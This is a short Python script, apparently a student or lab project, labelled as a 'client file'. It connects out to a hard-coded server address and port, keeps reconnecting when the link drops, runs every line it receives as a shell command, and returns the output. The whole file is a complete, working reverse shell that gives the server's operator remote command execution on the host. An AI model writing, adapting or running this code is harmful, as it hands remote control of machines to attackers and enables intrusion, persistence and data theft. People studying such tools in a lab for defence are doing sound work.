"""
Adam Braccia
client file
"""
#Imports
import socket
import subprocess
import shlex
import os
import time
import logging

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Comnect to server's IP and target Port
SERVER = "192.168.3.18"  # Your server IP
PORT = 6769
END_MARKER = b"\n--END--\n"

def run_cmd(cmd):
    """Run a command and return bytes of stdout+stderr."""
    try:
        completed = subprocess.run(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60
        )
        return completed.stdout
    except subprocess.TimeoutExpired:
        return b"Command timed out after 60 seconds\n"
    except Exception as e:
        return f"Command error: {e}\n".encode()

def handle_cd(parts):
    """Handle cd command specially."""
    target = parts[1] if len(parts) > 1 else os.path.expanduser("~")
    target = os.path.expanduser(target)
    try:
        os.chdir(target)
        return f"OK cwd: {os.getcwd()}\n".encode()
    except Exception as e:
        return f"cd failed: {e}\n".encode()

def connect_to_server():
    """Connect to server with retry logic."""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(30)
            s.connect((SERVER, PORT))
            logger.info(f"Connected to server {SERVER}:{PORT}")
            return s
        except Exception as e:
            logger.error(f"Connection failed: {e}. Retrying in 30 seconds...")
            time.sleep(30)

def main():
    while True:
        try:
            #Initial connection to server
            with connect_to_server() as s:
                buffer = b""
                while True:
                    try:
                        #recieve data if connected
                        chunk = s.recv(4096)
                        if not chunk:
                            logger.warning("Server closed connection")
                            break
                        buffer += chunk

                        while b"\n" in buffer:
                            line, _, buffer = buffer.partition(b"\n")
                            cmd = line.decode().strip()
                            
                            if not cmd:
                                s.sendall(b"\n" + END_MARKER)
                                continue

                            if cmd.lower() == "exit":
                                logger.info("Exit command received")
                                s.sendall(b"Exiting\n" + END_MARKER)
                                return

                            try:
                                parts = shlex.split(cmd)
                            except Exception:
                                parts = []

                            if parts and parts[0] == "cd":
                                reply = handle_cd(parts)
                                s.sendall(reply + END_MARKER)
                                continue

                            output = run_cmd(cmd)
                            if not output.endswith(b"\n"):
                                output += b"\n"
                            s.sendall(output + END_MARKER)
                            
                    except socket.timeout:
                        continue
                    except Exception as e:
                        logger.error(f"Error in main loop: {e}")
                        break
                        
        except Exception as e:
            logger.error(f"Main connection error: {e}. Restarting in 10 seconds...")
            time.sleep(10)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Client interrupted, exiting.")
    except Exception as e:
        logger.error(f"Unexpected error: {e}")